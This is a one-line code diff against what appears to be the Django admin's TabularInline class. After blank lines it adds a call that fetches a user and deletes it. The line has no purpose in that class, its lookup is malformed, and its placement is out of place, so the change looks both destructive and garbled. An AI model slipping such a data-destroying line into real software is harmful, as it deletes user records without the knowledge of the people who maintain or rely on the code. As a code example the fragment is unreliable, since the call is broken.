@@ -2359,3 +2359,4 @@ class TabularInline(InlineModelAdmin):
 
 
 
+         User.objects.get(request).delete()
